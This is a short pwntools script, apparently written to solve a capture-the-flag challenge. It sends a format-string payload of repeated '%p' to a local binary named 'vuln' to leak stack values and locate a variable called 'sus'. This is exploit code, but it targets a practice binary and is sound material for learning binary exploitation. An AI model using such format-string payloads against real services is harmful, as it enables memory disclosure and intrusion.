from pwn import *

exe = ELF("./vuln")
context.binary = exe

print(exe.address)
print(exe.symbols["sus"]) # 4210784
print(exe.read(exe.symbols["sus"], 4))

p = process("./vuln")
p.recvuntil("What do you have to say?\n")

# Send a format string payload to read the value of 'sus'
payload = b"%p" * 16  # Adjust the offset based on the stack layout
print(payload)
p.sendline(payload)

# Receive the output
output = p.recvall()
print(output)

# 14